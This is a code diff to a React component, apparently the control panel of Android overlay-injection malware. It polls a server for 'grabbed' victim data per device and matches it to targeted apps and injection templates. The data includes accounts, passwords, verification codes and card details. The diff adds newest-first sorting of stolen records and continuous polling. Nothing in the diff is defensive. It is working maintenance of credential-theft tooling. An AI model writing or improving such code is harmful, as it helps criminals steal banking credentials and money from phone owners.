@@ -39,6 +39,21 @@ function grabbedRecordKey(item) {
   return `${item?.packageName || ''}:${item?.timestamp || ''}:${JSON.stringify(item?.data || {})}`
 }
 
+function grabbedTimestamp(item) {
+  const raw = item?.timestamp ?? item?.createdAt ?? 0
+  if (typeof raw === 'number') return raw < 1e12 ? raw * 1000 : raw
+  const numeric = Number(raw)
+  if (Number.isFinite(numeric) && numeric > 0) return numeric < 1e12 ? numeric * 1000 : numeric
+  const parsed = Date.parse(raw)
+  return Number.isFinite(parsed) ? parsed : 0
+}
+
+function compareGrabbedNewest(a, b) {
+  const timeDiff = grabbedTimestamp(b) - grabbedTimestamp(a)
+  if (timeDiff !== 0) return timeDiff
+  return Number(b?.id || 0) - Number(a?.id || 0)
+}
+
 export default function InjectionTab({
   resolvedDeviceId,
   sendWs,
@@ -85,9 +100,9 @@ export default function InjectionTab({
 
   useEffect(() => { loadData() }, [loadData])
 
-  // 重注期间轮询新记录：历史数据保留；检测到本次新增记录后结束“注入中”状态。
+  // 注入中心打开期间持续同步最新记录；重注的新记录到达后结束“注入中”状态。
   useEffect(() => {
-    if (!resolvedDeviceId || Object.keys(reinjectSessions).length === 0) return undefined
+    if (!resolvedDeviceId) return undefined
     let cancelled = false
 
     const pollGrabbedData = async () => {
@@ -95,10 +110,11 @@ export default function InjectionTab({
         const res = await api.request(`/api/injection/grabbed-data?deviceId=${encodeURIComponent(resolvedDeviceId)}`)
         const list = Array.isArray(res) ? res : (res?.data || res?.items || [])
         if (cancelled || !Array.isArray(list)) return
-        setInjGrabbed?.(list)
+        const sortedList = [...list].sort(compareGrabbedNewest)
+        setInjGrabbed?.(sortedList)
 
         const completedPackages = Object.entries(reinjectSessions)
-          .filter(([pkg, session]) => list.some(item =>
+          .filter(([pkg, session]) => sortedList.some(item =>
             item.packageName === pkg && !session.existingKeys.includes(grabbedRecordKey(item))
           ))
           .map(([pkg, session]) => ({ pkg, templateId: session.templateId }))
@@ -377,10 +393,12 @@ export default function InjectionTab({
             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 10 }}>
               {sortedMatchedApps.map(({ packageName, appName, icon, tpl }) => {
                 const reinjectSession = reinjectSessions[packageName]
-                const grabbed = injGrabbed.find(g =>
-                  g.packageName === packageName &&
-                  (!reinjectSession || !reinjectSession.existingKeys.includes(grabbedRecordKey(g)))
-                )
+                const grabbed = injGrabbed
+                  .filter(g =>
+                    g.packageName === packageName &&
+                    (!reinjectSession || !reinjectSession.existingKeys.includes(grabbedRecordKey(g)))
+                  )
+                  .sort(compareGrabbedNewest)[0]
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                 // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
